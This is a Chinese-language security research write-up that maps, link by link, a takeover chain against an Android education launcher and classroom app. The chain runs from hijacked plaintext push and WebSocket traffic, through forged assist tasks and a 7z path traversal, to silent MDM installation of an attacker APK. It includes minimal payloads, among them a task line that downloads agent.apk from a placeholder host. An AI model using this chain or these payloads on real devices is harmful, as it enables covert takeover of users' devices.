# 端到端链路

本文按执行顺序给出完整接管链路，逐环标注机制、代码位置与验证状态。

状态定义：

- **已闭合**：逻辑链两端均已在反编译代码中定位，且现场行为与预期一致；
- **已观测**：可观测层面已确认（线上字节、回执、连接建立）；
- **未闭合**：逻辑上必要，但现场尚未取得正向证据。

## 链路总览

```
① 设备接入研究者控制的广播域
        ↓
② 设备与推送服务器建立长连接（明文自定义协议）
        ↓
③ 应答器接管该连接，伪造注册应答
        ↓
④ 构造下行业务消息帧（assist-notify）
        ↓
⑤ 设备解析消息并返回标准回执
        ↓
⑥ 消息经本地广播派发至平台消息接收器
        ↓
⑦ 接收器按 subMsgType 路由到远程协助模型
        ↓
⑧ 跨进程通知协助服务
        ↓
⑨ 协助服务进入协助态 → 拉取任务列表（明文 HTTP）
        ↓
⑩ 应答器返回伪造任务脚本
        ↓
⑪ 脚本解释器执行 installAppOnline(url)
        ↓
⑫ 下载 APK → 策略管理器 → AIDL → MDM 服务
        ↓
⑬ MDM 服务静默安装
        ↓
⑭ 研究者应用获得常驻能力，完成接管
```

## 逐环状态

| # | 环节 | 机制 | 代码/证据位置 | 状态 |
| --- | --- | --- | --- | --- |
| 1 | 接入广播域 | 设备连接研究者提供的接入点，研究者成为其网关 | 现场网络状态 | 已闭合 |
| 2 | 建立长连接 | 推送 SDK 连接下发地址的固定端口 | 推送 SDK 连接实现 | 已闭合 |
| 3 | 接管连接 | 用户态 TCP 应答器以服务端身份完成握手与注册 | 应答器实现 + 线上字节 | 已观测 |
| 4 | 帧构造 | 按 2.2/2.5 结构编码 `MESSAGE(0x03)` | 帧编码器 + 离线回读校验 | 已闭合 |
| 5 | 解析与回执 | 设备解析帧并返回 `MESSAGE_FB(0x83)`，含 msgId | 线上回执字节逐位校验 | 已观测 |
| 6 | 广播派发 | 回执发送成功后调用广播派发 | 推送客户端解码实现 | 已闭合 |
| 7 | 消息路由 | `appId == subAppId` 且按 `subMsgType` 分派 | 平台消息接收器 | 已闭合 |
| 8 | 协助分支 | `assist-notify` → 协助模型 → 跨进程发送 | 平台消息接收器 + 协助模型 | 已闭合 |
| 9 | 跨进程 | `Messenger` 发送 `what` + `message_key` | 协助服务 IPC 实现 | 已闭合 |
| 10 | 进入协助 | 解析 `operate == "ENTRY"` → 携带 `assistId` 启动协助 | 协助服务实现 | 已闭合 |
| 11 | 拉取任务 | 进入协助后立即请求任务接口 | 协助服务 + 远程数据源 | 已闭合（逻辑） |
| 12 | 明文任务面 | 任务接口历史上以明文 HTTP 承载 | 地址解析逻辑 + 历史命中 | 已闭合 |
| 13 | 脚本执行 | 解释器无白名单，支持下载/安装/命令 | 解释器实现 | 已闭合 |
| 14 | 静默安装 | 下载回调 → 策略代理 → AIDL → MDM 服务 | 安装链 11 环逐段确认 | 已闭合 |

## 关键代码位置（脱敏描述）

| 事实 | 位置 |
| --- | --- |
| 启动流程中「严重崩溃则跳过主进程初始化」的早退 | 平台 Application `onCreate()` |
| 主进程初始化入口 | 平台 Application `doOnMainProcess()` |
| 消息接收器注册点（唯一） | 消息模块 `onCreateOnMainProcess()` |
| 注册前置的三个事件接收器 | 同方法前半段 |
| 广播派发与回执耦合 | 推送客户端 `dealMessage()` |
| 路由表 | 平台消息接收器 `disposeMessage()` |
| 协助通知解析 | 协助服务 `assistNotify()` |
| 任务接口定义 | 远程协助数据源 |
| 在线安装 | 解释器 `installAppOnline()` |
| 安装回调 | `installAppOnline` 内部匿名回调 `onSuccess()` |
| 策略代理 | 策略管理器 `installApplication()` |
| MDM 通道 | AIDL action 声明（Manifest 服务节点） |
| 令牌失效全局拦截 | `PollInterfaceManager.isIntercept()` |

## 未闭合环节

第 6 环之后存在一个尚未取得正向证据的判定点：**平台消息接收器是否已在设备的主进程中完成注册**。

依据：

- 注册动作只出现在「消息模块初始化」方法中，且该方法只在主进程初始化流程内被调用；
- 该初始化流程受两个前置条件约束：主进程判定、以及「严重崩溃」早退分支；
- 同方法内 `LauncherPushService` 的注册语句之前还有三个事件接收器注册，方法自身无异常保护，任一注册抛异常都会跳过后续注册，而异常被上层逐项 `try/catch` 吞掉；
- 现场表现为：帧被解析、回执正常返回，但所有业务分支（协助、管控、资源同步、升级预下载）均无任何可观测副作用。

已排除的假设：

| 假设 | 排除依据 |
| --- | --- |
| 账号不匹配导致消息被过滤 | 消息实体 `userId` 与注册帧 `uid` 一致；`userId` 为字符串比较 |
| 消息重复导致丢弃 | 去重表为内存集合，`load()` 为空实现，新 msgId 必不重复 |
| 消息 JSON 解析失败 | 序列化/反序列化均为默认实现，字段名一致 |
| 跨进程导致广播丢失 | 推送服务与接收器同属主进程，使用进程内广播 |
| 登录态失效导致请求被拦截 | 设备处于已登录状态 |
| 严重崩溃导致初始化被跳过 | 设备启动无任何修复/安全页；且正常启动路径会在延时后清除崩溃标志 |

因此该环节的验证需要一个**不依赖业务消息本身**的外部可观测探针，例如：利用注册应答中的 `clientId` 变化触发接收器内的客户端注册请求（该请求会产生真实网络行为）。相关探针已实现，等待执行结论。

## 2026-11-08 代码级复核：字段级契约与不依赖推送的触发路径

### 一、第二条触发路径（不需要推送消息）

首页数据检查回调 `HomeViewModel.afterCheckData()` 的执行顺序：

1. `checkAppUpdate$default(...)` — 触发 `requestAfterLogin`
2. `doRules()`
3. `getCheckDataEntity().getAssist()` 非空 → `JsonUtil.objToJson(assist)` → `AssistModel.sendAssistMessage(json)`
4. `checkFontConfig()` → `LocationHelper.start()`

`CheckDataEntity` 来自 `AccountRemoteDataSource.requestAfterLogin`：
`GET %s/api/v2/pub/platform/users/{userId}/afterLogin`，其中 `%s = UrlCache.getHttpUrl()`。

`UrlCache.getHttpUrl()` → `getAddressList("SA106003")`（服务类型 `LAUNCHER`）：
优先取 `SessionData.reloadAccountInfo().getMicroAddressDTOList()`（登录响应下发），
为空时回退 `Configuration.getHttpUrlArray()`。

结论：只要该基址落在研究者可控的明文 HTTP 主机上，`afterLogin` 响应中带 `assist`
字段即可在**首页加载时零交互**拉起协助会话，与第 4–6 环（推送下行）完全解耦。

### 二、字段级契约（本轮复核新增）

| 环节 | 代码事实 |
| --- | --- |
| 协助通知解析 | `AssistNotify.parseJsonObject`：只读 `id`（`optString`，默认空串）与 `hidden`（`optInt`，默认 0），并把 `operate` 强制置为 `"ENTRY"` |
| 最小会话载荷 | `/assists` 响应返回 `{"id":"assist_x","hidden":1}` 即触发 ENTRY（`hidden=1` 抑制浮层） |
| 会话由响应驱动 | `AssistManager$requestAssist$1.onNext(String)`：非空 → `new JSONObject(json)` → `AssistNotify.parseJsonObject` → `JsonUtil.objToJson` → `AssistManager.sendAssistMessage(...)` |
| 任务列表解析 | `AssistModelImpl$2.preNext(String)`：`new JSONArray(json)`，逐项读 `id` / `instruction` / `step`（`optInt` 默认 1），补 `userId`、`deviceId` 后入 `TaskAsyncAuto` |
| 脚本执行 | `AssistModelImpl$2$1.onExecute(TaskEntity)`：`ZAZELexer(instruction)` → `ZAZEParser` → `MyVisitor.visit(prog())` → `AssistTaskResult` → `upAssistResult(...)` |
| 任务最小载荷 | `[{"id":"t1","instruction":"installAppOnline(\"http://<host>/agent.apk\")","step":1}]` |

### 三、安装腿（逐段确认为 MDM 静默安装）

`AssistFunc.installAppOnline(url)`
→ 路径 `DOWNLOAD_APP_DIR/assist/<md5(url)>.apk`
→ `DownloadManager.download(url, path, null, callback)`
→ `AssistFunc$installAppOnline$1.onSuccess`
→ `PolicyManager.getApplicationPolicyProxy().installApplication(path)`
→ `MdmHolder`
→ `com.xuehai.system.mdm.action_aidl`（MDM 服务）
→ 静默安装，无安装确认界面。


---

## 主链分级（2026-11-13 定稿）

在「基址为 HTTPS」前提下，把既有链路重新分为两条主链：**A 为第一主链**（最可靠），B 为备用/控制面。

### A. 课堂明文 WebSocket → 自动下载 → 7z native 解压越界（第一主链）

选它的四条理由：①课堂 WS 是明文且现场劫持成功过（`Auth` 头明文、应答 accept 正常）；②不依赖 HTTPS 基址、盒子自检、`SysAuthority.getPreDownloadApp()`、推送接收器；③服务端下行即触发，无需点击；④解压走 native，Java 层无 `../` 规范化。

| # | 跳 | 代码位置 |
| --- | --- | --- |
| 1 | 课堂 WS 建连与分发 | `HandleSocketMsgService.smali`（`ServerMessage{cId,cmd,smsg}`，`cmd=0xa/0xb` 教师上下线走 `ContextMessage.sendMsg`） |
| 2 | 下载动作落点 | `StudentDeskTopActivity.smali:5971-5985`（`"action_socket_download_ppt_resource"` → `presenter.autoDownLoadRes`） |
| 3 | 资源存在性判断 / 触发下载 | `StudentDeskTopPresenter.smali:1462 autoDownLoadRes` → `:359 checkAudioResExit` → `StartServiceHelper.smali:1996 startDownLoadPptService` |
| 4 | 下发下载 Intent | `StartServiceHelper.smali:1721-1845`（action `download_ppt_action`，extras `taskId`/`resourceId`/`desktopId`） |
| 5 | 资源元数据 | `ResourceHelper.smali:1160-1270`：`/api/v4/resource/single?appSubType=&sourceId=&userId=&sourceUrl=`，基址 = `XHMicroServer.getActualIp("SA104009")` |
| 6 | 下载执行 | `StuFtpManager.smali:640-800`（`0xc351` 注入的 `address+rootPath+"/"+tag+"/"+name`）或 `HttpBaseDownload` → `BoxServer` → `FileService.download("/box/file?url=b64")` |
| 7 | 解压 | `ResourceHelper.smali:627 doHandDownLoadSuccess` → `needDecode`（7z 后缀）→ `Z7Extractor.smali:93 extractFile` → native `nExtractFile:173` |
| 8 | 越界出口 | `/mnt/sdcard/xhproxy/<加密名>`（`HttpRequest.<clinit>` → `checkProxy` → `JNISetProxy`，零校验）/ `/sdcard/xuehai/config/*.ini` / `/sdcard/xuehai/app/<pkg>/<ver>/<pkg>.apk` |
| 9 | 收尾 | 代理劫持 launcher 出网；或预置 APK + 任务行 → `AppInstallManager.installApp` → `installApplication(savePath)` → MDM AIDL 静默安装 |

**未闭合的一跳**：第 2 跳的触发侧——`action_socket_download_ppt_resource` 目前只在 `ResourceDownLoadService$1`（下载完成后）见到发送点，`smsg.type → autoDownLoadRes / StartServiceHelper` 的映射尚待钉死。

### B. 明文微服务表投毒（备用 / 控制面）

`http://ms.yunzuoye.net/api/v2/pub/microServer/list/`（`XHMicroServerV2.smali:28-53`）→ `parseMicroUrl`（要求数组，key = 纯 `serverType`）→ `URL_MAP` / MMKV → `AddressLoader.formatUrl` 强制补 `http://` ⇒ `SA104009` / `SA106003` / `SB103013` 全部指向研究者主机。

用途：为 A 提供伪造 `ResourceInfo.zipUrl`、给 launcher 降级服务地址、盒子自检回 `xh`。

**为何不能作第一主链**：`RoleJudgmentHelper.isBaiFenYunApp()`（`RoleJudgmentHelper.smali:171-177`）为 `const/4 v0,0x0` 硬编码 false，`AutoDownloadManager.checkPreDownload()`（`:733`）因此永不触发 ⇒ 该链只能控制「下载内容/地址」，不能自动发起下载。

---

## 定稿 v3（2026-11-13）：主链 A 逐跳表（21 跳，代码级）

> 本表取代此前所有"候选链"表述。链 A 的入口是**课堂 App 的明文 WebSocket**，出口是**launcher 的 MDM 静默安装**。中间借助"7z native 无路径过滤"完成从"固定目录写"到"任意路径写"的放大，再借助"launcher 主库位于共享存储"完成从"文件写"到"安装任务注入"的放大。

| # | 跳 | 应用 | 代码位置 | 门禁 | 判据 |
| --- | --- | --- | --- | --- | --- |
| 01 | WS 收帧 | C | `smali_classes3/com/xh/ws/sockethelper/StudentWebSocketHelper$2.smali` | 无（明文 TCP 8889） | 抓包 |
| 02 | 帧转服务 | C | `smali_classes9/com/xh/business_module/socketmsg/HandleSocketMsgService.smali` | 无 | 代码 |
| 03 | 按 tag 路由 | C | `smali_classes9/com/xh/business_module/app/BusinessApp.smali`（注册表） | 字符串比较 | 代码 |
| 04 | canvas 处理器 | C | `.../socketmsg/MessageHandleForCanvasHelper.smali`（`canvas_tag`） | 无 | 代码 |
| 05 | type=3 解析 | C | 同上（`GsonUtil.fromJson(PhraseInfo)` → `ContextMessage.sendMsg`） | 无 | 代码 |
| 06 | 事件派发 | C | `ContextMessage.smali`（`activityList` → `BaseActivity.onMsgEvent`） | Activity 存活 | 代码 |
| 07 | 桌面接收 | C | `smali_classes2/com/xh/studesktop/ui/impl/StudentDeskTopActivity.smali` | 无 | 代码 |
| 08 | Presenter | C | `.../studesktop/presenter/impl/StudentDeskTopPresenter.smali`（`playPhrase`） | 仅判空 | 代码 |
| 09 | 下载服务 | C | `.../business_module/pushmsgservice/DownLoadPhraseService.smali` | 无 | 代码 |
| 10 | URL 组装 | C | `smali_classes10/com/xh/ftp/StuFtpManager.smali`（`getFileUrl` / `downloadNormal`） | 无 | 代码 |
| 11 | HTTP 下载 | C | `smali_classes9/com/xh/common/http/HttpBaseDownload.smali` | 无 | 代码 |
| 12 | 下载完成 | C | `.../resourcehelper/ResourceHelper.smali`（`doHandDownLoadSuccess`） | 文件非空 | 代码 |
| 13 | 判解压 | C | `smali_classes9/com/xh/communits/FilePathCheckToos.smali`（`needDecode`） | 7z 后缀 | 代码 |
| 14 | native 解压 | C | `smali_classes7/com/hzy/lib7z/Z7Extractor.smali` → `libun7zip.so` | 无 `../` 过滤 | 静态分析 |
| 15 | 越界落盘 | FS | 由 7z 条目名决定 | 外部存储写权限 | 待真机 |
| 16 | 库路径 | L | `smali_classes3/com/xuehai/launcher/data/db/MyDaoMaster$1.smali` | `isSdcardEnable()` | 代码 |
| 17 | 库打开 | L | `.../data/db/BaseLocalDataSource.smali`（`xh_launcher.db`） | `user_version=96` | 代码 |
| 18 | 任务拾取 | L | `.../application/data/AppLocalDataSource.smali`（`status != 0x65`） | 行存在 | 代码 |
| 19 | 首页触发 | L | `.../home/HomeViewModel$checkAppUpdate$1.smali` → `updateAllApps` | 首页加载 | 代码 |
| 20 | 批量执行 | L | `.../application/util/AppUpdateManager.smali`（`executeAppUpdateTask`） | `0x20` 默认授予 | 代码 |
| 21 | 下载+安装 | L | 同上（`pushDownloadTask` → `downloadAndInstall` → `addToInstallPool`） | 包名/版本号 | 代码 |
| 22 | 静默安装 | L | `.../application/util/AppInstallManager.smali` → `ApplicationPolicyProxy.installApplication` | 无签名校验 | 代码 |
| 23 | MDM | 系统 | `MdmHolder` → AIDL `com.xuehai.system.mdm.action_aidl` | 服务存在 | 代码 |

### 触发前提（唯一的非代码前提）

链 A 需要一个"已运行的课堂 App 进程且持有 8889 长连接"。实测：设备空闲时该连接不存在（120 秒内设备仅有 3200 推送流量）；此时唯一可控入口是让课堂 App 建立连接（`course://com.xh.smartclassstu/open?...` 深链或一次课堂界面操作）。

### 已排除的入口（同一版本实测）

| 入口 | 结论 |
| --- | --- |
| 3200 推送五类消息（`app-notification`/`app-upgrade`/`app-upgrade-prepare`/`app-syncMessage`/`control-service`/`assist-notify`） | 全部 ACK，30–40 秒内零下游连接 |
| `LauncherPushService` 注册 | 未注册（`payload=null` 崩溃探针未触发进程崩溃） |
| launcher exported 广播 `LauncherReceiver` | 需本机发射者，网络侧无法投递 |
| 课堂 App 的 service/receiver | 全部 `exported=false`；`CONNECTIVITY_CHANGE` 仅发本地消息 |
| 控制 Provider / 明文 HTTP body / Tinker / OTA / HTTPS MITM | 逐条代码级否证（见 `docs/STATUS.md`） |
